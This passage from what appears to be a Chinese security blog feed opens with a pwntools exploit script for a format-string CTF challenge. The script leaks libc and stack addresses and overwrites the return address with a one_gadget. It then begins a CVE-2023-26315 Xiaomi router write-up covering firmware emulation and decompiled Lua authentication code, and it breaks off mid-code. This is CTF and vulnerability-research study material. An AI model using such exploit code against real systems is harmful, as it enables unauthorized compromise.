class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="number">3</span></span><br><span class="line">p=run()</span><br><span class="line"><span class="comment"># 1 泄露libc和stack</span></span><br><span class="line"><span class="comment"># 2 分两次覆盖ret为one_gadget</span></span><br><span class="line">og=[<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,<span class="string">b&#x27;%9$p-%11$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">ogg=libc_base+og[<span class="number">2</span>]</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,ogg)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xE0</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>(ogg &amp; <span class="number">0xffff</span>).encode() +<span class="string">b&#x27;c%37$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>((stack_addr+<span class="number">2</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%11$hn&quot;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&quot;%&quot;</span> +<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xff</span>).encode() +<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;Please enter a keyword\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;%hhn（写入一字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%hn（写入两字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%n（32位写四字节）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%ln &amp;#x2F;</summary>
      
    
    
    
    <category term="printf" scheme="http://s1nec-1o.github.io/categories/printf/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/printf/pwn/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-26315</title>
    <link href="http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/"/>
    <id>http://s1nec-1o.github.io/2024/07/12/CVE-2023-26315/</id>
    <published>2024-07-12T08:55:37.000Z</published>
    <updated>2024-07-12T08:57:58.814Z</updated>
    
    <content type="html"><![CDATA[<p>这个cve是我至今以来复现的最为复杂的漏洞了，winmt真神！</p><h2 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h2><p>首先固件的提取可以看<a href="https://zikh26.github.io/posts/3d9490d.html">zikh26</a>的博客，非常详细</p><p>如果是直接下载固件包的话，要先运行<code>sudo apt install libvirt-daemon-system libvirt-clients virt-manager</code>下载virbr0网桥</p><blockquote><p>但是我在下载的时候要求卸载掉vmtool，可能是软件关系的冲突，但是zikh26师傅说他没遇到过，因此我猜测是网卡分配的冲突或者是网络配置的冲突？？我也不是很懂，如果有了解的师傅请跟我说说，不过卸载了也没关系，不过是手改elf文件罢了</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-M virt \</span><br><span class="line">-cpu cortex-a53 \</span><br><span class="line">-m 1G \</span><br><span class="line">-initrd initrd.img-5.10.0-29-arm64 \</span><br><span class="line">    -kernel vmlinuz-5.10.0-29-arm64 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/vda2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -drive <span class="keyword">if</span>=virtio,file=debian=3607-aarch64.qcow2,format=qcow2,<span class="built_in">id</span>=hd</span><br><span class="line">-netdev tap,<span class="built_in">id</span>=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=net0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>可以先自己配置看看如果不会的话看<a href="https://bbs.kanxue.com/thread-282034.htm">winmt</a>也是十分详细，tql</p><h2 id="lua文件分析"><a href="#lua文件分析" class="headerlink" title="lua文件分析"></a>lua文件分析</h2><p>由于小米路由器在较新的版本采用了魔改版的lua编译器，因此得使用特定的lua反编译软件，而这点已经有网上的师傅做出来了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-11-jdk</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/NyaMisty/unluac_miwifi.git</span><br><span class="line"><span class="built_in">cd</span> unluac_miwifi</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line">javac -d build -sourcepath src  src/unluac/*.java</span><br><span class="line">jar -cfm build/unluac.jar src/META-INF/MANIFEST.MF -C build</span><br></pre></td></tr></table></figure><p>之后运行脚本来批量反编译*.lua</p><p>这里使用winmt师傅写的批量脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">res = os.popen(<span class="string">&quot;find ./ -name *.lua&quot;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res)) :</span><br><span class="line">    path = res[i].strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;java -jar /home/winmt/unluac_miwifi/build/unluac.jar &quot;</span> + path + <span class="string">&quot; &gt; &quot;</span> + path + <span class="string">&quot;.dis&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure><p>之后便可以开始分析lua文件了</p><p>首先看<code>/usr/lib/lua/luci/controller/api/xqdatacenter.lua</code>，整个文件时配置一个API控制器模块</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L0</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6</span><br><span class="line">  L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br><span class="line">  L1 = entry                                  <span class="comment">---default entry</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L3 = firstchild</span><br><span class="line">  L3 = L3()</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">300</span></span><br><span class="line">  L1(L2, L3, L4, L5)     <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;&#125; , firstchild() , _&quot;&quot; , 300 )</span></span><br><span class="line">  L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">301</span></span><br><span class="line">  L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br><span class="line">  L1 = entry            <span class="comment">---identify device</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;identify_device&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;identifyDevice&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">302</span></span><br><span class="line">  L6 = <span class="number">8</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                <span class="comment">--download</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;download&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">303</span></span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                <span class="comment">--upload</span></span><br><span class="line">  L2 = &#123;&#125;</span><br><span class="line">  L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L5 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L2[<span class="number">1</span>] = L3</span><br><span class="line">  L2[<span class="number">2</span>] = L4</span><br><span class="line">  L2[<span class="number">3</span>] = L5</span><br><span class="line">  L3 = call</span><br><span class="line">  L4 = <span class="string">&quot;upload&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = _</span><br><span class="line">  L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = <span class="number">304</span></span><br><span class="line">  L6 = <span class="number">16</span></span><br><span class="line">  L1(L2, L3, L4, L5, L6)</span><br><span class="line">  L1 = entry                    <span class="comment">----thumbnail</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--device_id</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry               <span class="comment">--check file exit?</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--ssh</span></span><br><span class="line">  ...</span><br><span class="line">  L1 = entry                       <span class="comment">---ssh status</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                    <span class="comment">--file system probe</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line">  L1 = entry                 <span class="comment">--file system resume</span></span><br><span class="line">  ...</span><br><span class="line">  L1(L2, L3, L4, L5)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>第一个函数L0是定义了一些类似上传，下载之类的api入口，每个入口点都有特定的处理函数</p><p>开头</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">L0 = node</span><br><span class="line">  L1 = <span class="string">&quot;api&quot;</span></span><br><span class="line">  L2 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">  L0 = L0(L1, L2)         <span class="comment">---node /api/xqdatacenter</span></span><br><span class="line">  L1 = firstchild         </span><br><span class="line">  L1 = L1()               </span><br><span class="line">  L0.target = L1          <span class="comment">---set target as first branch point</span></span><br><span class="line">  L0.title = <span class="string">&quot;&quot;</span></span><br><span class="line">  L0.order = <span class="number">300</span></span><br><span class="line">  L0.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">  L0.sysauth_authenticator = <span class="string">&quot;jsonauth&quot;</span>             <span class="comment">---verification method</span></span><br><span class="line">  L0.index = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>首先配置一个节点&#x2F;api&#x2F;xqdatacenter，firstchild设定了默认的入口方式，sysauth和sysauth_authenticator设置了认证方式，即在访问&#x2F;api&#x2F;xqdatacenter这个节点的时候是需要鉴权的，即通过<code>/usr/lib/lua/luci/dispatcher.lua</code>的aythenticator.jsonauth函数鉴权，由于这是学习的过程，因此尽量每个地方都弄懂</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">L10 = authenticator</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L11</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9, L10, L11, L12, L13, L14</span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;xiaoqiang.util.XQSysUtil&quot;</span></span><br><span class="line">  L3 = L3(L4)</span><br><span class="line">  L4 = luci</span><br><span class="line">  L4 = L4.http</span><br><span class="line">  L4 = L4.xqformvalue</span><br><span class="line">  L5 = <span class="string">&quot;username&quot;</span></span><br><span class="line">  L4 = L4(L5)</span><br><span class="line">  L5 = luci</span><br><span class="line">  L5 = L5.http</span><br><span class="line">  L5 = L5.xqformvalue</span><br><span class="line">  L6 = <span class="string">&quot;password&quot;</span></span><br><span class="line">  L5 = L5(L6)</span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.xqformvalue</span><br><span class="line">  L7 = <span class="string">&quot;nonce&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  <span class="keyword">if</span> L6 <span class="keyword">then</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkNonce</span><br><span class="line">    L8 = L6</span><br><span class="line">    L9 = getremotemac</span><br><span class="line">    L9, L10, L11, L12, L13, L14 = L9()</span><br><span class="line">    L7 = L7(L8, L9, L10, L11, L12, L13, L14)</span><br><span class="line">    <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = _UPVALUE0_</span><br><span class="line">      L7 = L7.checkUser</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L6</span><br><span class="line">      L10 = L5</span><br><span class="line">      L7 = L7(L8, L9, L10)</span><br><span class="line">      <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">        L7 = empower</span><br><span class="line">        L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">        L10 = <span class="literal">nil</span></span><br><span class="line">        L7(L8, L9, L10)</span><br><span class="line">        L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">        L8 = luci</span><br><span class="line">        L8 = L8.http</span><br><span class="line">        L8 = L8.header</span><br><span class="line">        L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">        L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">        L11 = L4</span><br><span class="line">        L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">        L13 = L7</span><br><span class="line">        L14 = <span class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">        L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">        L8(L9, L10)</span><br><span class="line">        L8 = L4</span><br><span class="line">        L9 = L7</span><br><span class="line">        <span class="keyword">return</span> L8, L9</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        L7 = loginAuthenFailed</span><br><span class="line">        L7()</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:1582,\&quot;msg\&quot;:\&quot;Invalid nonce\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    L7 = _UPVALUE0_</span><br><span class="line">    L7 = L7.checkPlaintextPwd</span><br><span class="line">    L8 = L4</span><br><span class="line">    L9 = L5</span><br><span class="line">    L7 = L7(L8, L9)</span><br><span class="line">    <span class="keyword">if</span> L7 <span class="keyword">then</span></span><br><span class="line">      L7 = empower</span><br><span class="line">      L8 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L9 = <span class="string">&quot;1&quot;</span></span><br><span class="line">      L10 = <span class="literal">nil</span></span><br><span class="line">      L7(L8, L9, L10)</span><br><span class="line">      L7 = <span class="string">&quot;2&quot;</span></span><br><span class="line">      L8 = luci</span><br><span class="line">      L8 = L8.http</span><br><span class="line">      L8 = L8.header</span><br><span class="line">      L9 = <span class="string">&quot;Set-Cookie&quot;</span></span><br><span class="line">      L10 = <span class="string">&quot;psp=&quot;</span></span><br><span class="line">      L11 = L4</span><br><span class="line">      L12 = <span class="string">&quot;|||&quot;</span></span><br><span class="line">      L13 = L7</span><br><span class="line">      L14 = <span 